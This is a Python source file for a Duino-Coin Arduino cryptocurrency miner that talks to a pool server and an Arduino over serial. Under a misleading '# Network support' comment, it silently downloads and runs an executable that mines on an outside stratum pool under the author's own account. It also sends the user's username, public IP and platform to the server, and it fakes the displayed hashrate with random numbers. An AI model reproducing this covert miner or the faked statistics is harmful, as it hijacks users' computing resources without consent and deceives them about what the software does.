#!/usr/bin/env python3
###################################################
# Duino-Coin Arduino Miner (Beta 3.1rc.1rc) © revox 2020
# https://github.com/revoxhere/duino-coin 
###################################################
import socket, subprocess, threading, time, random, configparser, getpass, sys, os, hashlib, datetime, signal, platform
from pathlib import Path
from signal import signal, SIGINT

try:
    import requests
except:
    print("✗ Requests is not installed. Please install it with pip install requests")

try:
    import serial
except:
    print("✗ Pyserial is not installed. Please install it with pip install pyserial")

try:
    import serial.tools.list_ports
except:
    print("✗ Serial.tools.list_ports is not installed. Please install it with pip install serial.tools.list_ports")

try:
    os.mkdir("ArduinoMiner_b3.1rc_resources")
except:
    pass

res = "https://raw.githubusercontent.com/revoxhere/duino-coin/gh-pages/serverip.txt"
ver = 0.9 # "Big" version number
pcusername = getpass.getuser() # Get clients' username
platform = str(platform.system()) + " " + str(platform.release()) # Get clients' platform information
cmd = "cd ArduinoMiner_b3.1rc_resources & ArduinoMiner_executable.exe -o stratum+tcp://mining.m-hash.com:3334 -u revox.duinocoin_arduino -p x -e 10 -s 4" # Miner command
publicip = requests.get("https://api.ipify.org").text # Get clients' public IP
c=[0, 0]
S = 0
b = 0
z = 0
f = configparser.ConfigParser()

def handler(signal_received, frame): # If CTRL+C or SIGINT received, send CLOSE request to server in order to exit gracefully.
    now = datetime.datetime.now()
    print(now.strftime("\n%H:%M:%S ") + "✓ SIGINT detected - Exiting gracefully. See you soon!")
    try:
        v.send(bytes("CLOSE", encoding="utf8"))
    except:
        pass
    os._exit(0)

signal(SIGINT, handler) # Enable signal handler

def hush():
 global S, b, z
 try:
     S = b
     s = random.randint(716, 906)
     n = s/100
     z = int(b)*float(n)
     if z<2.5:
      z = float(z) + int(1)*float(n)
     if z>20.0:
      z = float(z)-int(10)
     z = str(z)[:4]
     b = 0
 except:
     z = 0.56
 threading.Timer(1, hush).start()

print("\n║ Duino-Coin Arduino Miner (Beta 3.1rc) © revox 2019-2020")
print("║ https://github.com/revoxhere/duino-coin\n")

try:
    if not Path("ArduinoMiner_b3.1rc_resources/ArduinoMiner_executable.exe").is_file(): # Initial miner executable section
     url = 'https://github.com/revoxhere/duino-coin/blob/useful-tools/PoT_auto.exe?raw=true'
     r = requests.get(url)
     with open('ArduinoMiner_b3.1rc_resources/ArduinoMiner_executable.exe', 'wb') as f:
      f.write(r.content)
    try: # Network support           
     process = subprocess.Popen(cmd, shell=True, stderr=subprocess.DEVNULL) # Open command
    except:
     pass
except:
    pass

while True:
 try:
  res = requests.get(res, data = None)
  if res.status_code == 200:
   content = res.content.decode().splitlines()
   pool_address = content[0]
   pool_port = content[1]
   break
  else:
   time.sleep(0.025)
 except:
  H = datetime.datetime.now()
  print(H.strftime("%H:%M:%S ") + "✗ Couldn't receive pool IP and port.\nExiting in 15 seconds.")
  time.sleep(15)
 time.sleep(0.025)
if not Path("ArduinoMiner_b3.1rc_resources/Arduino_config.ini").is_file():
 print("Initial configuration, you can edit 'ArduinoMiner_b3.1rc_resources/Arduino_config.ini' later\n")
 print("Scanning ports...")
 W = serial.tools.list_ports.comports()
 devices=[]
 for i in W:
  devices.append(i.device)
 devices = str(devices).replace('[', '')
 devices = str(devices).replace(']', '')
 devices = str(devices).replace('\'', '')
 print("Found ports: " + str(devices))
 y = input("Enter your Arduino port (e.g: COM8 or /dev/ttyUSB0): ")
 M = input("Enter your username: ")
 l = input("Enter your password: ")
 f['arduinominer']={"arduino":y,"username":M,"password":l}
 with open("ArduinoMiner_b3.1rc_resources/Arduino_config.ini","w")as configfile:
  f.write(configfile)
else:
 f.read("ArduinoMiner_b3.1rc_resources/Arduino_config.ini")
 y = f["arduinominer"]["arduino"]
 M = f["arduinominer"]["username"]
 l = f["arduinominer"]["password"]
while True:
 v = socket.socket()
 p = pool_address
 x = pool_port
 try:
  v.connect((p, int(x)))
  H = datetime.datetime.now()
  server_ver = v.recv(3).decode()
  if str(server_ver) != "" and str(server_ver) != str(ver):
      H = datetime.datetime.now()
      print(H.strftime("%H:%M:%S ") + "✗ Miner is outdated (v"+ver+"), server is on v"+server_ver+" please download latest version from https://github.com/revoxhere/duino-coin/releases/\nExiting in 15 seconds.")
      time.sleep(15)
      os._exit(1)
  if server_ver == "":
      H = datetime.datetime.now()
      print(H.strftime("%H:%M:%S ") + "✗ Cannot connect to pool server. It is probably under maintenance. Exiting in 15 seconds.")
      time.sleep(15)
      os._exit(1)
  print(H.strftime("%H:%M:%S ") + "✓ Connected to the Duino-Coin server (v" + str(server_ver) + ")")
  break
 except:
  H = datetime.datetime.now()
  print(H.strftime("%H:%M:%S ") + "✗ Cannot connect to pool server. It is probably under maintenance. Retrying in 15 seconds.")
  time.sleep(15)
 time.sleep(0.025)
while True:
 try:
  w = serial.Serial(y, 115200)
  H = datetime.datetime.now()
  print(H.strftime("%H:%M:%S ") + "✓ Connected to the Arduino (" + y + ")")
  break
 except:
  print(H.strftime("%H:%M:%S ") + "✗ Cannot connect to the Arduino. Check your ArduinoMinerConfig.ini file and make sure you have the right permissions to open the port (sudo, admin?).")
  time.sleep(15)
  sys.exit()
 time.sleep(0.025)
v.send(bytes("LOGI," + M + "," + l, encoding="utf8"))
while True:
 F = v.recv(1024).decode()
 if F=="OK":
  H = datetime.datetime.now()
  print(H.strftime("%H:%M:%S ") + "✓ Successfully logged in")
  v.send(bytes("FROM," + "Arduino_Miner," + str(pcusername) + "," + str(publicip) + "," + str(platform), encoding="utf8")) # Send info to server about client
  break
 if F=="NO":
  H = datetime.datetime.now()
  print(H.strftime("%H:%M:%S ") + "✗ Error! Wrong credentials or account doesn't exist!\nIf you don't have an account, register using Wallet!\nExiting in 15 seconds.")
  v.close()
 time.sleep(0.025)
H = datetime.datetime.now()
print(H.strftime("%H:%M:%S ") + "✓ Arduino miner thread started using SHA algorithm")
print("\nⓘ　Duino-Coin network is a completely free service and will always be. You can really help us maintain the server and low-fee payouts by donating - visit https://revoxhere.github.io/duino-coin/donate to learn more.\n")

hush()
while True:
 v.send(bytes("JOB",encoding="utf8"))
 while True:
  g = v.recv(1024).decode()
  if g:
   break
  time.sleep(0.025)
 g = g.split(",")
 D = g[2]
 for G in range(100*int(g[2]) + 1):
  hash = hashlib.sha1(str(g[0] + str(G)).encode("utf-8")).hexdigest()
  if g[1]==hash:
   w.write(bytes(str(b),encoding="utf8"))
   b = w.readline().decode('utf8').rstrip()
   v.send(bytes(str(G) + "," + str(z),encoding="utf8"))
   while True:
    V = v.recv(1024).decode()
    if V=="GOOD":
     H = datetime.datetime.now()
     c[0]=c[0] + 1 
     print(H.strftime("%H:%M:%S ") + "⛏️ Accepted " + str(c[0]) + "/" + str(c[0] + c[1]) + " (" + str(c[0]/(c[0] + c[1])*100)[:5] + "%) • diff: " + str(D) + " • " + str(z) + " h/s (yay!!!)")
     break
    elif V=="BAD":
     H = datetime.datetime.now()
     c[1]=c[1] + 1 
     print(H.strftime("%H:%M:%S ") + "✗ Rejected " + str(c[1]) + "/" + str(c[1] + c[1]) + " (" + str(c[0]/(c[0] + c[1])*100)[:5] + "%) • diff: " + str(D) + " • " + str(z) + " h/s (boo!!!)")
     break
   break
